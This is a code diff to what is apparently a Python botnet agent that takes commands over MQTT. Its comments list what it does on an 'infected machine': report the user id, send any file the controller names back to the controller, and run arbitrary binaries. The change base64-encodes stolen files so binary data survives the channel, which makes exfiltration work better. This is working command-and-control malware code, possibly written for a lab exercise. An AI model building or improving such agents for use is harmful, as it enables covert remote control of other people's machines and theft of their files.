@@ -5,6 +5,7 @@
 #   4. id of the user running the bot (output of 'id command').
 #   5. copying of a file from the "infected machine" to the controller (file path is a parameter specified by the controller).
 #   6. executing a binary inside the "infected machine" specified by the controller (e.g. '/usr/bin/ps').
+import base64
 import subprocess
 import paho.mqtt.client as mqtt
 from consts import *
@@ -29,11 +30,11 @@ def on_message(client, userdata, msg):
             elif action == CMD_COPY_FROM_BOT_TO_CONTROLLER:
                 try:
                     with open(argument, "rb") as f:
-                        # Use a prefix so the controller knows this is a file download
-                        file_data = f.read().decode(errors='replace')
-                        result = f"FILE_DATA:{argument}:{file_data}"
+                        # Encoding to Base64 ensures the binary doesn't break the text channel
+                        encoded_str = base64.b64encode(f.read()).decode('utf-8')
+                        result = f"FILE_B64:{argument}:{encoded_str}"
                 except Exception as e:
-                    result = f"Error reading file: {str(e)}"
+                    result = f"Error: {str(e)}"
             elif action == CMD_LIST_FILES:
                 # If argument is empty, just use ['ls'], otherwise ['ls', argument]
                 cmd_list = ["ls", argument] if argument else ["ls"]
